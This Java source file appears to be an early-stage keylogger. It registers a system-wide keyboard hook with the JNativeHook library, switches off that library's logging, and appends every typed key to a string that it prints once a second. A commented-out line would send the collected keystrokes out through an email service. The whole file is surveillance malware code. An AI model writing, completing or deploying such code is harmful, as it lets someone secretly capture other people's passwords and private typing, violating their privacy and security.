package de.soass;

import de.soass.email.EmailService;
import de.soass.filemanager.Conserver;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.jms.Destination;
import javax.mail.MessagingException;
import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.Console;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URLDecoder;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Main  implements NativeKeyListener {

    String s ="";
    public Main() throws Exception {
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        GlobalScreen.registerNativeHook();
        GlobalScreen.addNativeKeyListener(this);
        logger.setUseParentHandlers(false);

        while (true){
            System.out.println(s);
         //   EmailService.sendupdate(s);
            s = "";
            Thread.sleep(1000);
        }

    }


    public static void main(String[] args) throws Exception {


        new Main();

   //     String path = Main.class.getProtectionDomain().getCodeSource().getLocation().getPath();
    //    String decodedPath = URLDecoder.decode(path, "UTF-8");

    }
    public static boolean big = false;
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        s += nativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode())   + " + ";
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {




    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }
}
